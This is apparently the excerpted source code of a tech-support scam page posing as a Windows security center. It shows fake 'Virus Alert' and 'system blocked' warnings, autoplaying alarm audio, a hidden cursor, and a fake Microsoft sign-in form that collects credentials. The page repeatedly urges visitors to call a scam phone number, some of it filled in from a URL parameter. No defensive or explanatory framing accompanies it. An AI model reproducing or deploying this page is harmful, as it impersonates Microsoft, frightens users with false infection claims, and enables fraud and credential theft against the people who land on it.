...
curl_setopt($ch, CURLOPT_POSTFIELDS,"cid=39995&tk=$tk");
...
<html lang="en">
  <head><meta charset="utf-8">
      ...
      <title>0467 Security center </title>
...
<link rel="stylesheet" href="css/font-awesome.min.css">
      ...
      <style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{animation : tawkMaxOpen .25s ease!important;}@keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>
         ...
         <script src="js/scainfo.js" type="text/javascript"></script>
    ...
    <script>
      ...
      <script type="text/javascript">
                  var ph0nq = getVariableFromURl('ph0nq');
              </script>
...
<!--<audio id="ado1">
        <source src="try/beep.mp3" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="ado2">
        <source src="try/eng.mp3" type="audio/mpeg">
      </audio>
    -->
      <audio id="mdchys">
  <source src="try/NtUGN1dKiCUr.mp3" type="audio/mpeg">
</audio>
<audio autoplay="" id="infogt">
  <source src="try/LhlCcb3bW5w3.mp3" type="audio/mpeg">
</audio>
      ...
      <div class="pro_box" style="cursor: none; display: default;">
        <img src="images/bx2.png" alt="" style="max-width: 100%;">
      </div>
      ...
      <div class="pro_box3" style="cursor: none; display: none;">
        <img src="images/bs001.png" alt="" style="max-width: 100%;">
      </div>
        ...
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              ...
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">    <script>document.write(ph0nq)</script>+1-805-366-5872
                </span>
              </span>
            </div>
          </div>
      ...
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        ...
        <p>
         <b>Access to this system has been blocked for security reasons</b>
         </p>
         ...
         <p>Closing this window may put your personal information at risk and may cause your Windows <span id="ip_add"></span> registration to be suspended. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px">Contact Windows support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">   <script>document.write(ph0nq)</script>+1-805-366-5872
            </span>
          </strong>
        </p>
      ...
      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this system has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px">    <script>document.write(ph0nq)</script>+1-805-366-5872
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        ...
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">    <script>document.write(ph0nq)</script>+1-805-366-5872
...
margin-left: 6px;
position: relative;
top: 5px;" class="blink3">Virus Alert (05261) !!</span>
...
<br>Your system has been reported to be infected with Trojan-type spyware.<br>For assistance, contact Microsoft Support<br><strong style="font-size:24px;" class="blink1"><script>document.write(ph0nq)</script>+1-805-366-5872 (Helpline) 			 	</strong></p>
...
<div id="login-box">
  ...
  <br>
  <p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
    Windows has been locked due to unusual activity.
<br>Try signing in again with your Microsoft ID and password.<br>If you need help, contact Microsoft Support.<br> <strong style="font-size:20px;"> <script>document.write(ph0nq)</script>+1-805-366-5872			 	</strong></p>
  ...
  <input type="submit" class="button1" name="Verify" value="Login" onclick="playSound1();">Login
